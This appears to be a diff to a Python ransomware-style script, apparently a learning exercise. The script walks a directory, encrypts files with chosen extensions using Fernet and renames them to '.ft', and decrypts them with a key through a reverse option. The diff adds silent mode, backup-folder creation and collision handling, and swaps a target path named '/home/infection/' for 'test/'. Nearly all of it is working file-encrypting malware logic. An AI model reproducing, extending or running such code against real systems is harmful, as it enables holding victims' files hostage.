@@ -52,30 +52,40 @@ def encript_file(filename):
 			shutil.copy(filename, args.savedir)
 		with open(filename, 'wb') as enc_file:
 			enc_file.write(enc_data)
+		if os.path.isfile(filename + '.ft'):
+			os.rename(filename + '.ft', filename + '_1' + '.ft')
 		os.rename(filename, filename + '.ft')
-		print(filename + " has been encrypted")
+		if not args.silent:
+			print(filename + " has been encrypted")
 	except:
 		pass
 		
 def unencript_file(name, key):
-	if name.endswith('.ft'):
-		#try:
-		cyphr = Fernet(key)
-		with open(name, 'rb') as text:
-			enc_data = text.read()
-		or_data = cyphr.decrypt(enc_data)
-		with open(name, 'wb') as or_file:
-			or_file.write(or_data)
-		os.rename(name, name[:len(name)-len('.ft')])
-		print(filename + " has been decrypted")
-		#except:
-		#print("Invalid key")
-		#exit()
+	if name.endswith('.ft') and not name.endswith('_1.ft'):
+		try:
+			cyphr = Fernet(key)
+			with open(name, 'rb') as text:
+				enc_data = text.read()
+			or_data = cyphr.decrypt(enc_data)
+			with open(name, 'wb') as or_file:
+				or_file.write(or_data)
+			os.rename(name, name[:len(name)-len('.ft')])
+			if not args.silent:
+				print(name[:len(name)-len('.ft')] + " has been decrypted")
+		except:
+			print("Invalid key or could not decrypt file")
+	if name.endswith('_1.ft'):
+		os.rename(name,  name[:len(name)-len('_1.ft')] + '.ft')
 
+
+if args.savedir:
+	if not os.path.exists(args.savedir):
+		os.makedirs(args.savedir)
+		print(f"Folder created")
 if args.genkey:
 	gen_key()
 
-dirpath = '/home/infection/'
+dirpath = 'test/'
 
 def getfiles(dirpath):
 	filelist = os.listdir(dirpath)
@@ -86,7 +96,7 @@ def getfiles(dirpath):
 		if args.reverse:
 			unencript_file(totalname, args.reverse)
 		else:
-			if not os.path.isdir(totalname) and not args.silent:
+			if not os.path.isdir(totalname):
 				if totalname.endswith(tuple(extensions)):
 					encript_file(totalname)
 getfiles(dirpath)
